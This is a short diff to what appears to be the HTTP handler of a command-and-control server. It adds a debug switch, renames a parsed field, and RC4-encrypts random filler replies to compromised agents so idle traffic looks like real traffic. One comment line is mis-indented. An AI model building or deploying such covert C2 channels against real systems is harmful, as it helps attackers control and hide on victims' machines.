@@ -38,6 +38,9 @@ def HTTPDFactory(config):
             self.rc4 = RC4(self.rc4_key.encode())
             self.db = self.config.get("redis")
             self.output = ""
+            self.debug = False
+            if self.config.get("debug-mode") == "on":
+                self.debug = True
             super(HTTPD, self).__init__(*args, **kwargs)
 
         def set_http_headers(self, force_download=False, filename=None):
@@ -102,19 +105,26 @@ def HTTPDFactory(config):
                 output = ""
                 parser = HTTPDParser(config)
 
+		# FIX THIS UUID IS NULL IT SHOULD BE ID PROBABLY
                 try:
-                    output = parser.parse_cmd(guid, data["Data"], data["UUID"])
+                    output = parser.parse_cmd(guid, data["Data"], data["ID"])
                 except:
                     pass
 
-                if not output == None:
+                if output:
                     uuid = output[:36]
                     output = output[37:]
+                    if self.debug:
+                        UI.warn("HTTPD Sending data to %s" % uuid)
+                        UI.warn(output)
+                    
                     self.output = base64.b64encode(self.rc4.crypt(output)).decode()
                     self.output = json.dumps({"UUID": uuid, "ID": guid, "Data": self.output})
 
                 else:
-                    self.output = json.dumps({"UUID": None, "ID": guid,"Data": Utils.gen_str(random.randrange(10,1000))})
+                    empty = "null %s" % Utils.gen_str(random.randrange(10,1000))
+                    data = base64.b64encode(self.rc4.crypt(empty)).decode()
+                    self.output = json.dumps({"UUID": None, "ID": guid,"Data": data})
 
                 self.return_json()
                 return
